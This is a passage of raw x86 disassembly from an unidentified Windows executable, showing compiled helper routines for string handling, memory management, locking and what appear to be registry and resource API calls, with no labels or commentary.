  401f03:	jae    0x401f0d
  401f05:	inc    esi
  401f06:	push   0x27
  401f08:	pop    eax
  401f09:	mov    WORD PTR [ecx+esi*2],ax
  401f0d:	add    edi,0x2
  401f10:	inc    esi
  401f11:	cmp    esi,edx
  401f13:	jb     0x401eea
  401f15:	pop    edi
  401f16:	xor    eax,eax
  401f18:	mov    WORD PTR [ecx+esi*2],ax
  401f1c:	pop    esi
  401f1d:	pop    ebx
  401f1e:	pop    ebp
  401f1f:	ret    0x4
  401f22:	int3   
  401f23:	int3   
  401f24:	int3   
  401f25:	int3   
  401f26:	int3   
  401f27:	int3   
  401f28:	int3   
  401f29:	int3   
  401f2a:	int3   
  401f2b:	int3   
  401f2c:	int3   
  401f2d:	int3   
  401f2e:	int3   
  401f2f:	int3   
  401f30:	mov    eax,0x80004005
  401f35:	ret    0x10
  401f38:	int3   
  401f39:	int3   
  401f3a:	int3   
  401f3b:	int3   
  401f3c:	int3   
  401f3d:	int3   
  401f3e:	int3   
  401f3f:	int3   
  401f40:	mov    edi,edi
  401f42:	push   ebp
  401f43:	mov    ebp,esp
  401f45:	push   DWORD PTR [ebp+0x14]
  401f48:	mov    edx,DWORD PTR [ebp+0xc]
  401f4b:	push   DWORD PTR [ebp+0x10]
  401f4e:	mov    ecx,DWORD PTR [ebp+0x8]
  401f51:	call   0x403980
  401f56:	pop    ebp
  401f57:	ret    0x10
  401f5a:	int3   
  401f5b:	int3   
  401f5c:	int3   
  401f5d:	int3   
  401f5e:	int3   
  401f5f:	int3   
  401f60:	mov    edi,edi
  401f62:	push   ebp
  401f63:	mov    ebp,esp
  401f65:	push   DWORD PTR [ebp+0x14]
  401f68:	mov    edx,DWORD PTR [ebp+0xc]
  401f6b:	push   DWORD PTR [ebp+0x10]
  401f6e:	mov    ecx,DWORD PTR [ebp+0x8]
  401f71:	call   0x403be0
  401f76:	pop    ebp
  401f77:	ret    0x10
  401f7a:	int3   
  401f7b:	int3   
  401f7c:	int3   
  401f7d:	int3   
  401f7e:	int3   
  401f7f:	int3   
  401f80:	mov    edi,edi
  401f82:	push   ebp
  401f83:	mov    ebp,esp
  401f85:	push   esi
  401f86:	mov    esi,ecx
  401f88:	mov    DWORD PTR [esi],0x4014f8
  401f8e:	call   0x401dc4
  401f93:	test   BYTE PTR [ebp+0x8],0x1
  401f97:	je     0x401fa0
  401f99:	push   esi
  401f9a:	call   0x404d30
  401f9f:	pop    ecx
  401fa0:	mov    eax,esi
  401fa2:	pop    esi
  401fa3:	pop    ebp
  401fa4:	ret    0x4
  401fa7:	int3   
  401fa8:	int3   
  401fa9:	int3   
  401faa:	int3   
  401fab:	int3   
  401fac:	mov    edi,edi
  401fae:	push   esi
  401faf:	mov    esi,ecx
  401fb1:	cmp    DWORD PTR [esi],0x0
  401fb4:	je     0x401fc1
  401fb6:	push   DWORD PTR [esi]
  401fb8:	call   DWORD PTR ds:0x4080cc
  401fbe:	and    DWORD PTR [esi],0x0
  401fc1:	pop    esi
  401fc2:	ret    
  401fc3:	int3   
  401fc4:	int3   
  401fc5:	int3   
  401fc6:	int3   
  401fc7:	int3   
  401fc8:	mov    edi,edi
  401fca:	push   ebp
  401fcb:	mov    ebp,esp
  401fcd:	push   ecx
  401fce:	mov    eax,ds:0x40700c
  401fd3:	xor    eax,ebp
  401fd5:	mov    DWORD PTR [ebp-0x4],eax
  401fd8:	push   ebx
  401fd9:	push   esi
  401fda:	mov    esi,ecx
  401fdc:	xor    ebx,ebx
  401fde:	push   edi
  401fdf:	cmp    DWORD PTR [esi+0x4],ebx
  401fe2:	jne    0x402029
  401fe4:	cmp    DWORD PTR [esi+0x8],ebx
  401fe7:	jne    0x402029
  401fe9:	push   0x401130
  401fee:	call   DWORD PTR ds:0x408074
  401ff4:	test   eax,eax
  401ff6:	je     0x402009
  401ff8:	push   0x401184
  401ffd:	push   eax
  401ffe:	call   DWORD PTR ds:0x408078
  402004:	mov    DWORD PTR [esi+0x4],eax
  402007:	jmp    0x402029
  402009:	push   ebx
  40200a:	push   ebx
  40200b:	push   0x401194
  402010:	call   DWORD PTR ds:0x40806c
  402016:	test   eax,eax
  402018:	je     0x402029
  40201a:	push   0x4011b0
  40201f:	push   eax
  402020:	call   DWORD PTR ds:0x408078
  402026:	mov    DWORD PTR [esi+0x8],eax
  402029:	mov    edi,DWORD PTR [esi+0x4]
  40202c:	test   edi,edi
  40202e:	je     0x402043
  402030:	push   ebx
  402031:	push   ebx
  402032:	push   DWORD PTR [ebp+0x8]
  402035:	mov    ecx,edi
  402037:	push   DWORD PTR [esi]
  402039:	call   DWORD PTR ds:0x4081d8
  40203f:	call   edi
  402041:	jmp    0x402061
  402043:	mov    edi,DWORD PTR [esi+0x8]
  402046:	test   edi,edi
  402048:	je     0x40205b
  40204a:	push   DWORD PTR [ebp+0x8]
  40204d:	mov    ecx,edi
  40204f:	push   DWORD PTR [esi]
  402051:	call   DWORD PTR ds:0x4081d8
  402057:	call   edi
  402059:	jmp    0x402061
  40205b:	call   DWORD PTR ds:0x408050
  402061:	mov    ecx,DWORD PTR [ebp-0x4]
  402064:	pop    edi
  402065:	pop    esi
  402066:	xor    ecx,ebp
  402068:	pop    ebx
  402069:	call   0x405170
  40206e:	mov    esp,ebp
  402070:	pop    ebp
  402071:	ret    0x4
  402074:	int3   
  402075:	int3   
  402076:	int3   
  402077:	int3   
  402078:	int3   
  402079:	mov    edi,edi
  40207b:	push   ebp
  40207c:	mov    ebp,esp
  40207e:	push   ecx
  40207f:	push   ecx
  402080:	mov    edx,DWORD PTR [ebp+0xc]
  402083:	push   ebx
  402084:	mov    ebx,ecx
  402086:	push   esi
  402087:	push   edi
  402088:	test   edx,edx
  40208a:	je     0x4020d5
  40208c:	xor    eax,eax
  40208e:	mov    edi,edx
  402090:	mov    DWORD PTR [ebp-0x4],eax
  402093:	mov    esi,eax
  402095:	mov    ecx,edi
  402097:	lea    eax,[ecx+0x2]
  40209a:	mov    DWORD PTR [ebp-0x8],eax
  40209d:	mov    ax,WORD PTR [ecx]
  4020a0:	add    ecx,0x2
  4020a3:	cmp    ax,WORD PTR [ebp-0x4]
  4020a7:	jne    0x40209d
  4020a9:	sub    ecx,DWORD PTR [ebp-0x8]
  4020ac:	sar    ecx,1
  4020ae:	inc    ecx
  4020af:	lea    edi,[edi+ecx*2]
  4020b2:	lea    esi,[esi+ecx*2]
  4020b5:	cmp    ecx,0x1
  4020b8:	jne    0x402095
  4020ba:	push   esi
  4020bb:	push   edx
  4020bc:	push   0x7
  4020be:	xor    eax,eax
  4020c0:	push   eax
  4020c1:	push   DWORD PTR [ebp+0x8]
  4020c4:	push   DWORD PTR [ebx]
  4020c6:	call   DWORD PTR ds:0x4080bc
  4020cc:	pop    edi
  4020cd:	pop    esi
  4020ce:	pop    ebx
  4020cf:	mov    esp,ebp
  4020d1:	pop    ebp
  4020d2:	ret    0x8
  4020d5:	mov    ecx,0x80004005
  4020da:	call   0x401cea
  4020df:	int3   
  4020e0:	int3   
  4020e1:	int3   
  4020e2:	int3   
  4020e3:	int3   
  4020e4:	int3   
  4020e5:	mov    edi,edi
  4020e7:	push   ebp
  4020e8:	mov    ebp,esp
  4020ea:	sub    esp,0x228
  4020f0:	mov    eax,ds:0x40700c
  4020f5:	xor    eax,ebp
  4020f7:	mov    DWORD PTR [ebp-0x8],eax
  4020fa:	push   ebx
  4020fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4020fe:	lea    eax,[ebp-0x220]
  402104:	push   esi
  402105:	push   edi
  402106:	push   eax
  402107:	mov    edi,ecx
  402109:	xor    ecx,ecx
  40210b:	push   0x2001f
  402110:	push   ecx
  402111:	push   ebx
  402112:	push   DWORD PTR [edi]
  402114:	mov    DWORD PTR [ebp-0x218],ecx
  40211a:	mov    DWORD PTR [ebp-0x214],ecx
  402120:	mov    DWORD PTR [ebp-0x210],ecx
  402126:	mov    DWORD PTR [ebp-0x220],ecx
  40212c:	call   DWORD PTR ds:0x4080b4
  402132:	mov    esi,eax
  402134:	test   esi,esi
  402136:	jne    0x4021f2
  40213c:	cmp    DWORD PTR [ebp-0x218],esi
  402142:	je     0x402152
  402144:	push   DWORD PTR [ebp-0x218]
  40214a:	call   DWORD PTR ds:0x4080cc
  402150:	mov    esi,eax
  402152:	mov    eax,DWORD PTR [ebp-0x220]
  402158:	mov    DWORD PTR [ebp-0x218],eax
  40215e:	test   esi,esi
  402160:	jne    0x4021f2
  402166:	lea    ecx,[ebp-0x228]
  40216c:	push   ecx
  40216d:	push   esi
  40216e:	push   esi
  40216f:	push   esi
  402170:	lea    ecx,[ebp-0x21c]
  402176:	push   ecx
  402177:	lea    ecx,[ebp-0x20c]
  40217d:	push   ecx
  40217e:	push   esi
  40217f:	push   eax
  402180:	jmp    0x4021b9
  402182:	lea    eax,[ebp-0x20c]
  402188:	push   eax
  402189:	lea    ecx,[ebp-0x218]
  40218f:	call   0x4020e5
  402194:	mov    esi,eax
  402196:	test   esi,esi
  402198:	jne    0x4021f2
  40219a:	lea    eax,[ebp-0x228]
  4021a0:	push   eax
  4021a1:	push   esi
  4021a2:	push   esi
  4021a3:	push   esi
  4021a4:	lea    eax,[ebp-0x21c]
  4021aa:	push   eax
  4021ab:	lea    eax,[ebp-0x20c]
  4021b1:	push   eax
  4021b2:	push   esi
  4021b3:	push   DWORD PTR [ebp-0x218]
  4021b9:	mov    DWORD PTR [ebp-0x21c],0x100
  4021c3:	call   DWORD PTR ds:0x4080c8
  4021c9:	test   eax,eax
  4021cb:	je     0x402182
  4021cd:	cmp    DWORD PTR [ebp-0x218],0x0
  4021d4:	je     0x4021e8
  4021d6:	push   DWORD PTR [ebp-0x218]
  4021dc:	call   DWORD PTR ds:0x4080cc
  4021e2:	mov    DWORD PTR [ebp-0x218],esi
  4021e8:	push   ebx
  4021e9:	mov    ecx,edi
  4021eb:	call   0x401fc8
  4021f0:	mov    esi,eax
  4021f2:	cmp    DWORD PTR [ebp-0x218],0x0
  4021f9:	je     0x402207
  4021fb:	push   DWORD PTR [ebp-0x218]
  402201:	call   DWORD PTR ds:0x4080cc
  402207:	mov    ecx,DWORD PTR [ebp-0x8]
  40220a:	mov    eax,esi
  40220c:	pop    edi
  40220d:	pop    esi
  40220e:	xor    ecx,ebp
  402210:	pop    ebx
  402211:	call   0x405170
  402216:	mov    esp,ebp
  402218:	pop    ebp
  402219:	ret    0x4
  40221c:	int3   
  40221d:	int3   
  40221e:	int3   
  40221f:	int3   
  402220:	int3   
  402221:	push   0x4
  402223:	mov    eax,0x405be8
  402228:	call   0x405ab2
  40222d:	mov    esi,ecx
  40222f:	mov    DWORD PTR [ebp-0x10],esi
  402232:	and    DWORD PTR [ebp-0x4],0x0
  402236:	call   0x4023ba
  40223b:	mov    ecx,esi
  40223d:	call   0x4046fd
  402242:	call   0x405a71
  402247:	ret    
  402248:	int3   
  402249:	int3   
  40224a:	int3   
  40224b:	int3   
  40224c:	int3   
  40224d:	push   0x24
  40224f:	mov    eax,0x405c18
  402254:	call   0x405b25
  402259:	mov    DWORD PTR [ebp-0x30],ecx
  40225c:	mov    eax,DWORD PTR [ebp+0x8]
  40225f:	test   eax,eax
  402261:	je     0x4023ab
  402267:	cmp    DWORD PTR [ebp+0xc],0x0
  40226b:	je     0x4023ab
  402271:	mov    ecx,eax
  402273:	xor    ebx,ebx
  402275:	push   0x2
  402277:	mov    DWORD PTR [ebp-0x1c],ebx
  40227a:	pop    edx
  40227b:	lea    esi,[ecx+0x2]
  40227e:	mov    ax,WORD PTR [ecx]
  402281:	add    ecx,edx
  402283:	cmp    ax,bx
  402286:	jne    0x40227e
  402288:	sub    ecx,esi
  40228a:	mov    DWORD PTR [ebp-0x14],ebx
  40228d:	sar    ecx,1
  40228f:	mov    DWORD PTR [ebp-0x4],ebx
  402292:	lea    eax,[ecx*2+0x2]
  402299:	xor    ecx,ecx
  40229b:	mov    DWORD PTR [ebp-0x28],eax
  40229e:	mul    edx
  4022a0:	seto   cl
  4022a3:	neg    ecx
  4022a5:	or     ecx,eax
  4022a7:	push   ecx
  4022a8:	call   0x404d95
  4022ad:	pop    ecx
  4022ae:	mov    ecx,eax
  4022b0:	mov    DWORD PTR [ebp-0x14],ecx
  4022b3:	jmp    0x4022c0
  4022b5:	mov    eax,0x4022bb
  4022ba:	ret    
  4022bb:	mov    ecx,DWORD PTR [ebp-0x14]
  4022be:	xor    ebx,ebx
  4022c0:	push   0x2
  4022c2:	mov    DWORD PTR [ebp-0x20],ecx
  4022c5:	pop    eax
  4022c6:	mov    edi,ecx
  4022c8:	mov    DWORD PTR [ebp-0x4],eax
  4022cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4022ce:	mov    DWORD PTR [ebp-0x24],edi
  4022d1:	call   0x401c65
  4022d6:	xor    ecx,ecx
  4022d8:	mov    DWORD PTR [ebp-0x18],ebx
  4022db:	push   0x2
  4022dd:	pop    edx
  4022de:	lea    eax,[eax*2+0x2]
  4022e5:	mov    BYTE PTR [ebp-0x4],0x3
  4022e9:	mov    DWORD PTR [ebp-0x2c],eax
  4022ec:	mul    edx
  4022ee:	seto   cl
  4022f1:	neg    ecx
  4022f3:	or     ecx,eax
  4022f5:	push   ecx
  4022f6:	call   0x404d95
  4022fb:	mov    esi,eax
  4022fd:	mov    DWORD PTR [ebp-0x4],0x2
  402304:	pop    ecx
  402305:	mov    DWORD PTR [ebp-0x18],esi
  402308:	mov    eax,edi
  40230a:	jmp    0x402324
  40230c:	mov    eax,0x402312
  402311:	ret    
  402312:	mov    DWORD PTR [ebp-0x4],0x2
  402319:	xor    ebx,ebx
  40231b:	mov    eax,DWORD PTR [ebp-0x14]
  40231e:	mov    edi,DWORD PTR [ebp-0x24]
  402321:	mov    esi,DWORD PTR [ebp-0x18]
  402324:	mov    BYTE PTR [ebp-0x4],0x5
  402328:	mov    DWORD PTR [ebp-0x20],esi
  40232b:	test   eax,eax
  40232d:	je     0x402385
  40232f:	test   esi,esi
  402331:	je     0x402385
  402333:	mov    ecx,DWORD PTR [ebp-0x28]
  402336:	push   ecx
  402337:	push   DWORD PTR [ebp+0x8]
  40233a:	push   ecx
  40233b:	push   eax
  40233c:	call   DWORD PTR ds:0x4081ac
  402342:	add    esp,0x10
  402345:	mov    ecx,eax
  402347:	call   0x401d13
  40234c:	mov    eax,DWORD PTR [ebp-0x2c]
  40234f:	push   eax
  402350:	push   DWORD PTR [ebp+0xc]
  402353:	push   eax
  402354:	push   esi
  402355:	call   DWORD PTR ds:0x4081ac
  40235b:	add    esp,0x10
  40235e:	mov    ecx,eax
  402360:	call   0x401d13
  402365:	mov    ecx,DWORD PTR [ebp-0x30]
  402368:	lea    eax,[ebp-0x18]
  40236b:	push   eax
  40236c:	lea    eax,[ebp-0x14]
  40236f:	push   eax
  402370:	call   0x40468e
  402375:	test   eax,eax
  402377:	je     0x402385
  402379:	mov    eax,DWORD PTR [ebp-0x1c]
  40237c:	mov    edi,ebx
  40237e:	mov    DWORD PTR [ebp-0x24],edi
  402381:	mov    esi,ebx
  402383:	jmp    0x40238a
  402385:	mov    eax,0x8007000e
  40238a:	xor    ebx,ebx
  40238c:	mov    BYTE PTR [ebp-0x4],0x2
  402390:	test   eax,eax
  402392:	push   esi
  402393:	setns  bl
  402396:	call   0x404d30
  40239b:	or     DWORD PTR [ebp-0x4],0xffffffff
  40239f:	push   edi
  4023a0:	call   0x404d30
  4023a5:	pop    ecx
  4023a6:	pop    ecx
  4023a7:	mov    eax,ebx
  4023a9:	jmp    0x4023ad
  4023ab:	xor    eax,eax
  4023ad:	call   0x405a71
  4023b2:	ret    0x8
  4023b5:	int3   
  4023b6:	int3   
  4023b7:	int3   
  4023b8:	int3   
  4023b9:	int3   
  4023ba:	mov    edi,edi
  4023bc:	push   esi
  4023bd:	push   edi
  4023be:	mov    edi,ecx
  4023c0:	xor    esi,esi
  4023c2:	mov    eax,DWORD PTR [edi+0x8]
  4023c5:	test   eax,eax
  4023c7:	jle    0x4023f5
  4023c9:	test   esi,esi
  4023cb:	js     0x402401
  4023cd:	cmp    esi,eax
  4023cf:	jge    0x402401
  4023d1:	mov    eax,DWORD PTR [edi]
  4023d3:	push   DWORD PTR [eax+esi*4]
  4023d6:	call   0x404d30
  4023db:	pop    ecx
  4023dc:	cmp    esi,DWORD PTR [edi+0x8]
  4023df:	jge    0x402401
  4023e1:	mov    eax,DWORD PTR [edi+0x4]
  4023e4:	push   DWORD PTR [eax+esi*4]
  4023e7:	call   0x404d30
  4023ec:	mov    eax,DWORD PTR [edi+0x8]
  4023ef:	inc    esi
  4023f0:	pop    ecx
  4023f1:	cmp    esi,eax
  4023f3:	jl     0x4023c9
  4023f5:	mov    ecx,edi
  4023f7:	call   0x4046fd
  4023fc:	pop    edi
  4023fd:	xor    eax,eax
  4023ff:	pop    esi
  402400:	ret    
  402401:	mov    ecx,0xc000008c
  402406:	call   0x401cc2
  40240b:	int3   
  40240c:	int3   
  40240d:	int3   
  40240e:	int3   
  40240f:	int3   
  402410:	int3   
  402411:	push   DWORD PTR [ecx+0x8]
  402414:	call   DWORD PTR ds:0x40802c
  40241a:	ret    
  40241b:	int3   
  40241c:	int3   
  40241d:	int3   
  40241e:	int3   
  40241f:	int3   
  402420:	mov    edi,edi
  402422:	push   ebp
  402423:	mov    ebp,esp
  402425:	push   ebx
  402426:	mov    ebx,DWORD PTR [ebp+0xc]
  402429:	push   esi
  40242a:	mov    esi,ecx
  40242c:	push   edi
  40242d:	lea    ecx,[ebx+0x1]
  402430:	add    ecx,DWORD PTR [esi]
  402432:	cmp    ecx,DWORD PTR [esi]
  402434:	jle    0x4024c5
  40243a:	cmp    ecx,ebx
  40243c:	jle    0x4024c5
  402442:	mov    edi,DWORD PTR [esi+0x4]
  402445:	cmp    ecx,edi
  402447:	jl     0x40247d
  402449:	cmp    edi,0x3fffffff
  40244f:	jg     0x4024c5
  402451:	add    edi,edi
  402453:	cmp    ecx,edi
  402455:	jge    0x402449
  402457:	push   0x2
  402459:	mov    eax,edi
  40245b:	pop    ecx
  40245c:	mul    ecx
  40245e:	test   edx,edx
  402460:	ja     0x4024c5
  402462:	jb     0x402469
  402464:	cmp    eax,0xffffffff
  402467:	ja     0x4024c5
  402469:	push   eax
  40246a:	push   DWORD PTR [esi+0x8]
  40246d:	call   DWORD PTR ds:0x408034
  402473:	test   eax,eax
  402475:	je     0x4024c5
  402477:	mov    DWORD PTR [esi+0x8],eax
  40247a:	mov    DWORD PTR [esi+0x4],edi
  40247d:	mov    ecx,DWORD PTR [esi]
  40247f:	test   ecx,ecx
  402481:	js     0x4024c5
  402483:	cmp    ecx,DWORD PTR [esi+0x4]
  402486:	jge    0x4024c5
  402488:	mov    edx,DWORD PTR [esi+0x4]
  40248b:	sub    edx,ecx
  40248d:	cmp    edx,DWORD PTR [esi+0x4]
  402490:	jg     0x4024c5
  402492:	mov    eax,DWORD PTR [esi+0x8]
  402495:	add    edx,edx
  402497:	lea    ecx,[eax+ecx*2]
  40249a:	lea    eax,[ebx+ebx*1]
  40249d:	push   eax
  40249e:	push   DWORD PTR [ebp+0x8]
  4024a1:	push   edx
  4024a2:	push   ecx
  4024a3:	call   DWORD PTR ds:0x4081ac
  4024a9:	add    esp,0x10
  4024ac:	mov    ecx,eax
  4024ae:	call   0x401d13
  4024b3:	add    DWORD PTR [esi],ebx
  4024b5:	xor    edx,edx
  4024b7:	mov    eax,DWORD PTR [esi+0x8]
  4024ba:	mov    ecx,DWORD PTR [esi]
  4024bc:	mov    WORD PTR [eax+ecx*2],dx
  4024c0:	xor    eax,eax
  4024c2:	inc    eax
  4024c3:	jmp    0x4024c7
  4024c5:	xor    eax,eax
  4024c7:	pop    edi
  4024c8:	pop    esi
  4024c9:	pop    ebx
  4024ca:	pop    ebp
  4024cb:	ret    0x8
  4024ce:	int3   
  4024cf:	int3   
  4024d0:	int3   
  4024d1:	int3   
  4024d2:	int3   
  4024d3:	int3   
  4024d4:	int3   
  4024d5:	int3   
  4024d6:	int3   
  4024d7:	int3   
  4024d8:	int3   
  4024d9:	int3   
  4024da:	int3   
  4024db:	int3   
  4024dc:	int3   
  4024dd:	int3   
  4024de:	int3   
  4024df:	int3   
  4024e0:	mov    edi,edi
  4024e2:	push   ebp
  4024e3:	mov    ebp,esp
  4024e5:	mov    eax,DWORD PTR [ebp+0x10]
  4024e8:	test   eax,eax
  4024ea:	je     0x4024ef
  4024ec:	and    DWORD PTR [eax],0x0
  4024ef:	mov    eax,0x80004001
  4024f4:	pop    ebp
  4024f5:	ret    0xc
  4024f8:	int3   
  4024f9:	int3   
  4024fa:	int3   
  4024fb:	int3   
  4024fc:	int3   
  4024fd:	int3   
  4024fe:	int3   
  4024ff:	int3   
  402500:	xor    eax,eax
  402502:	inc    eax
  402503:	ret    0x4
  402506:	int3   
  402507:	int3   
  402508:	int3   
  402509:	int3   
  40250a:	int3   
  40250b:	int3   
  40250c:	int3   
  40250d:	int3   
  40250e:	int3   
  40250f:	int3   
  402510:	xor    eax,eax
  402512:	ret    0x4
  402515:	int3   
  402516:	int3   
  402517:	int3   
  402518:	int3   
  402519:	int3   
  40251a:	push   0x4
  40251c:	mov    eax,0x405c56
  402521:	call   0x405ab2
  402526:	mov    esi,ecx
  402528:	mov    DWORD PTR [ebp-0x10],esi
  40252b:	mov    DWORD PTR [esi],0x401524
  402531:	push   esi
  402532:	mov    DWORD PTR [ebp-0x4],0x1
  402539:	call   0x402800
  40253e:	lea    eax,[esi+0x10]
  402541:	cmp    BYTE PTR [eax+0x18],0x0
  402545:	je     0x402552
  402547:	push   eax
  402548:	mov    BYTE PTR [eax+0x18],0x0
  40254c:	call   DWORD PTR ds:0x408114
  402552:	add    esi,0x4
  402555:	mov    DWORD PTR [ebp-0x10],esi
  402558:	mov    ecx,esi
  40255a:	mov    DWORD PTR [ebp-0x4],0x2
  402561:	call   0x4023ba
  402566:	mov    ecx,esi
  402568:	call   0x4046fd
  40256d:	call   0x405a71
  402572:	ret    
  402573:	int3   
  402574:	int3   
  402575:	int3   
  402576:	int3   
  402577:	int3   
  402578:	int3   
  402579:	int3   
  40257a:	int3   
  40257b:	int3   
  40257c:	int3   
  40257d:	int3   
  40257e:	int3   
  40257f:	int3   
  402580:	mov    edi,edi
  402582:	push   ebp
  402583:	mov    ebp,esp
  402585:	push   esi
  402586:	mov    esi,ecx
  402588:	call   0x40251a
  40258d:	test   BYTE PTR [ebp+0x8],0x1
  402591:	je     0x40259a
  402593:	push   esi
  402594:	call   0x404d30
  402599:	pop    ecx
  40259a:	mov    eax,esi
  40259c:	pop    esi
  40259d:	pop    ebp
  40259e:	ret    0x4
  4025a1:	int3   
  4025a2:	int3   
  4025a3:	int3   
  4025a4:	int3   
  4025a5:	int3   
  4025a6:	cmp    BYTE PTR [ecx+0x18],0x0
  4025aa:	je     0x4025b7
  4025ac:	push   ecx
  4025ad:	mov    BYTE PTR [ecx+0x18],0x0
  4025b1:	call   DWORD PTR ds:0x408114
  4025b7:	ret    
  4025b8:	int3   
  4025b9:	int3   
  4025ba:	int3   
  4025bb:	int3   
  4025bc:	int3   
  4025bd:	int3   
  4025be:	int3   
  4025bf:	int3   
  4025c0:	push   0x4
  4025c2:	mov    eax,0x405c7e
  4025c7:	call   0x405ab2
  4025cc:	cmp    DWORD PTR [ebp+0xc],0x0
  4025d0:	je     0x40261e
  4025d2:	cmp    DWORD PTR [ebp+0x10],0x0
  4025d6:	je     0x40261e
  4025d8:	mov    esi,DWORD PTR [ebp+0x8]
  4025db:	lea    edi,[esi+0x10]
  4025de:	push   edi
  4025df:	call   DWORD PTR ds:0x40810c
  4025e5:	and    DWORD PTR [ebp-0x10],0x0
  4025e9:	push   DWORD PTR [ebp+0x10]
  4025ec:	and    DWORD PTR [ebp-0x4],0x0
  4025f0:	lea    ecx,[esi+0x4]
  4025f3:	push   DWORD PTR [ebp+0xc]
  4025f6:	call   0x40224d
  4025fb:	push   edi
  4025fc:	mov    esi,eax
  4025fe:	call   DWORD PTR ds:0x408108
  402604:	lea    ecx,[ebp-0x10]
  402607:	call   0x40461f
  40260c:	neg    esi
  40260e:	sbb    esi,esi
  402610:	and    esi,0x7ff8fff2
  402616:	lea    eax,[esi-0x7ff8fff2]
  40261c:	jmp    0x402623
  40261e:	mov    eax,0x80070057
  402623:	call   0x405a71
  402628:	ret    0xc
  40262b:	int3   
  40262c:	int3   
  40262d:	int3   
  40262e:	int3   
  40262f:	int3   
  402630:	push   0x424
  402635:	mov    eax,0x405cb4
  40263a:	call   0x405b60
  40263f:	mov    edx,DWORD PTR [ebp+0x10]
  402642:	xor    esi,esi
  402644:	mov    eax,DWORD PTR [ebp+0x8]
  402647:	mov    ebx,DWORD PTR [ebp+0xc]
  40264a:	mov    DWORD PTR [ebp-0x41c],edx
  402650:	mov    DWORD PTR [ebp-0x420],esi
  402656:	mov    DWORD PTR [ebp-0x4],esi
  402659:	mov    DWORD PTR [ebp-0x42c],ecx
  40265f:	mov    DWORD PTR [ebp-0x430],esi
  402665:	mov    DWORD PTR [ebp-0x418],esi
  40266b:	push   0x2
  40266d:	pop    ecx
  40266e:	push   ecx
  40266f:	push   esi
  402670:	push   eax
  402671:	mov    BYTE PTR [ebp-0x4],0x1
  402675:	call   DWORD PTR ds:0x40806c
  40267b:	mov    edi,eax
  40267d:	mov    DWORD PTR [ebp-0x424],edi
  402683:	test   edi,edi
  402685:	jne    0x402693
  402687:	call   0x401d97
  40268c:	mov    esi,eax
  40268e:	jmp    0x4027c5
  402693:	push   esi
  402694:	push   ebx
  402695:	push   DWORD PTR [ebp-0x41c]
  40269b:	push   edi
  40269c:	call   DWORD PTR ds:0x408070
  4026a2:	mov    ebx,eax
  4026a4:	test   ebx,ebx
  4026a6:	jne    0x4026b2
  4026a8:	call   0x401d97
  4026ad:	jmp    0x4027bc
  4026b2:	push   ebx
  4026b3:	push   edi
  4026b4:	call   DWORD PTR ds:0x408068
  4026ba:	mov    DWORD PTR [ebp-0x428],eax
  4026c0:	test   eax,eax
  4026c2:	je     0x4026a8
  4026c4:	push   ebx
  4026c5:	push   edi
  4026c6:	call   DWORD PTR ds:0x40807c
  4026cc:	mov    ebx,eax
  4026ce:	mov    DWORD PTR [ebp-0x41c],ebx
  4026d4:	lea    eax,[ebx+0x1]
  4026d7:	cmp    eax,ebx
  4026d9:	jae    0x402709
  4026db:	lea    eax,[ebp-0x414]
  4026e1:	cmp    DWORD PTR [ebp-0x418],eax
  4026e7:	je     0x4026f4
  4026e9:	lea    ecx,[ebp-0x418]
  4026ef:	call   0x40475a
  4026f4:	lea    ecx,[ebp-0x420]
  4026fa:	call   0x40461f
  4026ff:	mov    eax,0x8007000e
  402704:	jmp    0x4027eb
  402709:	push   0x2
  40270b:	pop    ecx
  40270c:	mul    ecx
  40270e:	mov    BYTE PTR [ebp-0x4],cl
  402711:	cmp    edx,esi
  402713:	ja     0x40274a
  402715:	cmp    eax,0xffffffff
  402718:	ja     0x40274a
  40271a:	cmp    eax,0x400
  40271f:	jbe    0x402735
  402721:	push   eax
  402722:	lea    ecx,[ebp-0x418]
  402728:	call   0x404769
  40272d:	mov    eax,DWORD PTR [ebp-0x418]
  402733:	jmp    0x402741
  402735:	lea    eax,[ebp-0x414]
  40273b:	mov    DWORD PTR [ebp-0x418],eax
  402741:	mov    DWORD PTR [ebp-0x4],0x1
  402748:	jmp    0x402775
  40274a:	mov    ecx,0x80070057
  40274f:	call   0x401cea
  402754:	mov    eax,0x40275a
  402759:	ret    
  40275a:	mov    edi,DWORD PTR [ebp-0x424]
  402760:	xor    esi,esi
  402762:	mov    ebx,DWORD PTR [ebp-0x41c]
  402768:	mov    DWORD PTR [ebp-0x4],0x1
  40276f:	mov    eax,DWORD PTR [ebp-0x418]
  402775:	test   eax,eax
  402777:	jne    0x402780
  402779:	mov    esi,0x8007000e
  40277e:	jmp    0x4027be
  402780:	push   ebx
  402781:	push   eax
  402782:	push   ebx
  402783:	push   DWORD PTR [ebp-0x428]
  402789:	push   esi
  40278a:	push   0x3
  40278c:	call   DWORD PTR ds:0x4080e8
  402792:	mov    ecx,eax
  402794:	test   ecx,ecx
  402796:	je     0x4026a8
  40279c:	mov    eax,DWORD PTR [ebp-0x418]
  4027a2:	xor    edx,edx
  4027a4:	push   DWORD PTR [ebp+0x14]
  4027a7:	mov    WORD PTR [eax+ecx*2],dx
  4027ab:	lea    ecx,[ebp-0x430]
  4027b1:	push   DWORD PTR [ebp-0x418]
  4027b7:	call   0x403218
  4027bc:	mov    esi,eax
  4027be:	push   edi
  4027bf:	call   DWORD PTR ds:0x408064
  4027c5:	lea    eax,[ebp-0x414]
  4027cb:	cmp    DWORD PTR [ebp-0x418],eax
  4027d1:	je     0x4027de
  4027d3:	lea    ecx,[ebp-0x418]
  4027d9:	call   0x40475a
  4027de:	lea    ecx,[ebp-0x420]
  4027e4:	call   0x40461f
  4027e9:	mov    eax,esi
  4027eb:	call   0x405a9e
  4027f0:	ret    0x10
  4027f3:	int3   
  4027f4:	int3   
  4027f5:	int3   
  4027f6:	int3   
  4027f7:	int3   
  4027f8:	int3   
  4027f9:	int3   
  4027fa:	int3   
  4027fb:	int3   
  4027fc:	int3   
  4027fd:	int3   
  4027fe:	int3   
  4027ff:	int3   
  402800:	mov    edi,edi
  402802:	push   ebp
  402803:	mov    ebp,esp
  402805:	push   esi
  402806:	mov    esi,DWORD PTR [ebp+0x8]
  402809:	push   edi
  40280a:	lea    edi,[esi+0x10]
  40280d:	push   edi
  40280e:	call   DWORD PTR ds:0x40810c
  402814:	lea    ecx,[esi+0x4]
  402817:	call   0x4023ba
  40281c:	push   edi
  40281d:	mov    esi,eax
  40281f:	call   DWORD PTR ds:0x408108
  402825:	pop    edi
  402826:	mov    eax,esi
